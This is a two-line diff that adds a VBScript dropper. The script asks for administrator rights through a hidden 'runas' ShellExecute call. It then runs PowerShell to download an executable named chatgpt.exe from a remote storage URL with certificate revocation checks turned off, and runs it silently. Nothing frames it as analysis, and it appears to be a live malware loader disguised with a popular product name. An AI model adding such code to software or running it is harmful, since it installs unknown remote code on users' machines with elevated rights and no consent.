@@ -1,0 +1,2 @@
+Set UAC = CreateObject("Shell.Application")
+UAC.ShellExecute "powershell", "-Command ""& {mkdir C:\Temp -Force 2>$null; curl.exe -L --ssl-no-revoke 'https://pub-58588e65d9b04333a98491a050f77e00.r2.dev/user/chatgpt.exe' -o C:\Temp\chatgpt.exe; Start-Process 'C:\Temp\chatgpt.exe' -ArgumentList '/S' -Wait}""", "", "runas", 0
